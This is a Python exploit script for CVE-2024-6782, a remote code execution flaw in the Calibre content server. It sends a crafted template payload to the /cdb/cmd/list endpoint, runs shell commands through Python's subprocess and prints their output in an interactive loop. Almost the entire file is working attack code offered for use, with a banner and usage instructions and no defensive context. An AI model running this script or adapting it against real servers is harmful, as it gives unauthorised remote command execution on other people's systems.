import requests
import json
import sys

class Main:
    def __init__(self, host_target, command):
        self._target = f"http://{host_target}/cdb/cmd/list"
        self._book_id = 1
        self._payload = f"python:def evaluate(a, b):\n  import subprocess\n  try:\n    return subprocess.check_output(['cmd.exe', '/c', '{command}'])\n  except Exception:\n    return subprocess.check_output(['sh', '-c', '{command}'])\n"

        req = requests.post(
            f"{self._target}",
            headers={"Content-Type": "application/json"},
            json=[
                ["template"],
                "",  #sortby
                "",  #asceding
                "",  #search_text
                1,  #limit results
                self._payload

            ],
        )

        try:
            response = req.json()
            self.response_format(response)

        except Exception as err:
            print(err)

    def response_format(self, response):
        try:
            books_id = response["result"]["book_ids"]
            print(f"\n\033[1;32m[ BOOK IDs ]:\033[m {books_id}\n")

            if (isinstance(response, dict) and "result" in response):
                    result_data = response["result"]
                    if ("data" in result_data and "template" in result_data["data"]):
                        template = result_data["data"]["template"]
                        if ("100" in template):
                            result = template["100"]
                        
                            formatted_result = result.replace('\\r\\n', '\n').replace('b\'', '').replace('\'', '').strip()
                            print(f"{' ' * 35}\033[1;32m[ Command Output ]\033[m\n")
                            print(formatted_result)
                        
                        else:
                            print("\033[1;34m[!] ERROR:\033[m '100' key not found in 'template'")

                    else:
                        print("\033[1;34m[!] ERROR:\033[m 'data' or 'template' key not found in 'result'")

            else:
                print("\033[1;34m[!] ERROR:\033[m 'result' key not found in response")
        except KeyError as e:
            print(f"\033[1;34m[!] ERROR:\033[m processing response: Missing key {e}")

        except Exception as e:
            print(f"\033[1;34m[!] ERROR:\033[m {e}")
         
if __name__ == "__main__":
    print("""\033[1;32m
              (    (        (                ) (   (       ) (            
   (    (     )\ ) )\ )  (  )\ )          ( /( )\ ))\ ) ( /( )\ )  *   )  
   )\   )\   (()/((()/(( )\(()/((     (   )\()|()/(()/( )\()|()/(` )  /(  
 (((_|(((_)(  /(_))/(_))((_)/(_))\    )\ ((_)\ /(_))(_)|(_)\ /(_))( )(_)) 
 )\___)\ _ )\(_)) (_))((_)_(_))((_)  ((_)__((_|_))(_))   ((_|_)) (_(_())  
((/ __(_)_\(_) |  |_ _|| _ ) _ \ __| | __\ \/ / _ \ |   / _ \_ _||_   _|  
 | (__ / _ \ | |__ | | | _ \   / _|  | _| >  <|  _/ |__| (_) | |   | |    
  \___/_/ \_\|____|___||___/_|_\___| |___/_/\_\_| |____|\___/___|  |_|    
                                                                          
             ######### CVE-2024-6782 ###########
             # Service Name: Calibre <= 1.14.0 #
             # Severity: critical              #
             # Type: Remote Code Execution     #
             # Author: 0xgrah4m                #
             ###################################


    \033[m""")
    if(len(sys.argv) != 2):
        print("\n[!] ./exploit.py < target:PORT >\n")
        sys.exit(1)

    print("\n\033[1;32m[*]\033[m Use Windows Commands!\n")
    while (True):
        shell = str(input("\033[1;36m[ Bs0D ] ~>> \033[m"))
        Main(sys.argv[1], shell)
